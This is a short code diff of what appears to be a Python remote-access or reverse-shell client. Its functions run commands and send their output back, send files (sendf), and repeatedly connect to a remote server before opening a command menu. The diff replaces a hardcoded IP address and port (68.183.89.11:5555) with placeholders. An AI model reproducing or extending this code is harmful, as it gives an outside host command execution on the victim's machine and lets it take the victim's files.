@@ -58,8 +58,7 @@ def python1(d1):
         send1(completed_process.stdout)
     else:
         send1("\n ... Execution Failed ... \n")
-
-#files --------------------------------------------------------------------
+        
 def sendf(imgpth):
     SEPARATOR = "<SEPARATOR>"
     filesize = os.path.getsize(imgpth)
@@ -151,7 +150,7 @@ def conect1():
     while True:
         time.sleep(10)
         try:
-            s.connect(('68.183.89.11',5555))
+            s.connect(('xx.xxx.xx.xx',xxxx))
             menu()
             s.close()
             break
